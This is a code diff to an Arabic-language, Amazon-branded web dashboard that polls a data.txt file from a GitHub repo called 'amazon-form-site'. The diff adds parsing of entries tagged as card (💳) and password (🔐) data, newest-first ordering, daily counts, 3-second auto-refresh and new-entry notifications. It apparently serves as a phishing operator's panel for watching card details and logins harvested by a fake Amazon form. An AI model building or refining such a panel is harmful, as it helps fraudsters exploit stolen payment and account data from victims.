@@ -19,7 +19,20 @@
             margin-bottom: 16px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.08);
             border-right: 5px solid #FF9900;
-            animation: slideIn 0.5s ease;
+            animation: slideIn 0.3s ease;
+            transition: all 0.3s ease;
+        }
+        .data-box:hover {
+            transform: translateX(-4px);
+            box-shadow: 0 8px 24px rgba(255, 153, 0, 0.15);
+        }
+        .data-box:first-child {
+            border-right-color: #FF4500;
+            background: #FFF5F0;
+        }
+        .data-box:nth-child(2) {
+            border-right-color: #FF6B00;
+            background: #FFF8F0;
         }
         @keyframes slideIn {
             from { opacity: 0; transform: translateY(-20px); }
@@ -44,6 +57,11 @@
         .refresh-btn:hover {
             transform: scale(1.05);
         }
+        .refresh-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
         .toast {
             position: fixed;
             bottom: 30px;
@@ -56,6 +74,7 @@
             animation: slideUp 0.5s ease;
             z-index: 1000;
             font-weight: 600;
+            box-shadow: 0 8px 32px rgba(34, 197, 94, 0.3);
         }
         .toast.show {
             display: block;
@@ -124,6 +143,34 @@
             padding: 30px;
             text-align: center;
         }
+        .time-badge {
+            font-size: 12px;
+            color: #999;
+            margin-top: 8px;
+        }
+        .entry-number {
+            display: inline-block;
+            background: #FF9900;
+            color: white;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .live-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+            margin-right: 6px;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
     </style>
 </head>
 <body>
@@ -132,10 +179,11 @@
         <div class="flex items-center gap-3">
             <span class="text-2xl font-black text-[#FF9900]">amazon</span>
             <span class="text-sm text-white/70 bg-white/10 px-3 py-1 rounded-full">📊 عرض البيانات</span>
+            <span class="text-sm text-white/50"><span class="live-dot"></span>مباشر</span>
         </div>
         <div class="flex items-center gap-3">
             <span id="notificationBadge" class="badge" style="display:none;">0</span>
-            <button onclick="fetchData()" class="refresh-btn">🔄 تحديث</button>
+            <button onclick="fetchData()" id="refreshBtn" class="refresh-btn">🔄 تحديث</button>
         </div>
     </div>
 
@@ -178,11 +226,26 @@
     <script>
         let lastData = '';
         let notificationCount = 0;
+        let isLoading = false;
 
         async function fetchData() {
+            if (isLoading) return;
+            isLoading = true;
+            
+            const btn = document.getElementById('refreshBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري...';
+            
             try {
-                const url = 'https://raw.githubusercontent.com/afffaaaa28-glitch/amazon-form-site/main/data.txt';
-                const response = await fetch(url);
+                // إضافة cache busting لمنع التخزين المؤقت
+                const url = 'https://raw.githubusercontent.com/afffaaaa28-glitch/amazon-form-site/main/data.txt?t=' + Date.now();
+                const response = await fetch(url, {
+                    cache: 'no-store',
+                    headers: {
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache'
+                    }
+                });
                 
                 if (!response.ok) {
                     throw new Error('HTTP ' + response.status);
@@ -217,6 +280,10 @@
                 `;
                 document.getElementById('statusBadge').textContent = '🔴';
             }
+            
+            isLoading = false;
+            btn.disabled = false;
+            btn.textContent = '🔄 تحديث';
         }
 
         function displayData(data) {
@@ -233,11 +300,58 @@
                 return;
             }
 
-            let html = `<div class="data-box" style="border-right-color: #FF9900; background: #FFF8F0;">`;
-            html += `<div class="text-sm font-bold mb-3" style="color: #FF9900;">📋 البيانات الكاملة</div>`;
-            html += `<pre>${data}</pre>`;
-            html += `</div>`;
+            // تقسيم البيانات إلى أقسام
+            const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
             
+            // عكس الترتيب (الأحدث أولاً)
+            const reversedSections = sections.reverse();
+            
+            let html = '';
+            let entryCount = sections.length;
+            
+            reversedSections.forEach((section, index) => {
+                const entryNumber = entryCount - index;
+                let title = '📝 بيانات جديدة';
+                const titleMatch = section.match(/📋.*|💳.*|🔐.*/);
+                if (titleMatch) {
+                    title = titleMatch[0];
+                }
+                
+                let content = section.replace(/^={50,}\n/, '').replace(/\n={50,}$/, '');
+                
+                // استخراج الوقت
+                let time = '';
+                const timeMatch = section.match(/🕐 الوقت: (.+)/);
+                if (timeMatch) {
+                    time = timeMatch[1];
+                }
+                
+                // ألوان حسب النوع
+                let borderColor = '#FF9900';
+                let bgColor = '#FFF8F0';
+                if (title.includes('💳')) {
+                    borderColor = '#22c55e';
+                    bgColor = '#F0FFF4';
+                } else if (title.includes('🔐')) {
+                    borderColor = '#8b5cf6';
+                    bgColor = '#F5F0FF';
+                } else if (title.includes('📋')) {
+                    borderColor = '#FF4500';
+                    bgColor = '#FFF5F0';
+                }
+                
+                html += `
+                    <div class="data-box" style="border-right-color: ${borderColor}; background: ${bgColor};">
+                        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
+                            <span class="entry-number">#${entryNumber}</span>
+                            <span class="text-sm font-bold" style="color: ${borderColor};">${title}</span>
+                            ${time ? `<span class="time-badge">🕐 ${time}</span>` : ''}
+                        </div>
+                        <pre style="margin-top: 12px;">${content}</pre>
+                    </div>
+                `;
+            });
+
             container.innerHTML = html;
             document.getElementById('statusBadge').textContent = '🟢';
         }
@@ -258,6 +372,14 @@
                     document.getElementById('lastEntryTime').textContent = timeMatch[1];
                 }
             }
+            
+            // عدد إدخالات اليوم
+            const today = new Date().toLocaleDateString('ar-EG');
+            let todayCount = 0;
+            sections.forEach(s => {
+                if (s.includes(today)) todayCount++;
+            });
+            document.getElementById('todayEntries').textContent = todayCount;
         }
 
         function showNotification() {
@@ -269,7 +391,6 @@
             badge.style.display = 'inline';
             badge.textContent = notificationCount;
             
-            // إشعار المتصفح - بطريقة آمنة
             try {
                 if ('Notification' in window && Notification.permission === 'granted') {
                     new Notification('📬 بيانات جديدة وصلت!', {
@@ -278,7 +399,7 @@
                     });
                 }
             } catch (e) {
-                console.log('الإشعارات غير مدعومة في هذا المتصفح');
+                console.log('الإشعارات غير مدعومة');
             }
             
             setTimeout(() => {
@@ -286,7 +407,6 @@
             }, 4000);
         }
 
-        // طلب إذن الإشعارات
         try {
             if ('Notification' in window && Notification.permission === 'default') {
                 Notification.requestPermission();
@@ -295,13 +415,12 @@
             console.log('الإشعارات غير مدعومة');
         }
 
-        // التحميل الأول
+        // التحميل الأول فوري
         fetchData();
 
-        // التحديث التلقائي كل 5 ثواني
-        setInterval(fetchData, 5000);
+        // التحديث التلقائي كل 3 ثواني (أسرع)
+        setInterval(fetchData, 3000);
 
-        // تحديث عند العودة للصفحة
         document.addEventListener('visibilitychange', () => {
             if (!document.hidden) {
                 fetchData();
